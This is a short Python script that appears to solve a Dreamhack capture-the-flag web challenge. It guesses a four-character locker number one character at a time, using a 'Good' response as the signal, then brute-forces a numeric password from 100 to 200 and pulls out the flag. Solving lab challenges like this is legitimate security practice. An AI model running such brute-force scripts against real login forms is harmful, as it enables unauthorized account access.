import requests
import string
import re

url = 'http://host3.dreamhack.games:15542'

alphanumeric = string.ascii_lowercase + string.digits

locker_num = ''

for _ in range(4):
    for i in alphanumeric:
        data = {
            'locker_num': locker_num + i
        }
        res = requests.post(url, data=data)
        if "Good" in res.text:
            locker_num += i
            break

print('locker_num: ', locker_num)

for password in range(100, 201):
    data = {
        'locker_num': locker_num,
        'password': str(password)
    }
    res = requests.post(url, data=data)
    if 'Good' not in res.text:
        print('password: ', password)
        match = re.search(r'DH\{[^>]*\}', res.text)
        print(match.group(0))
        break
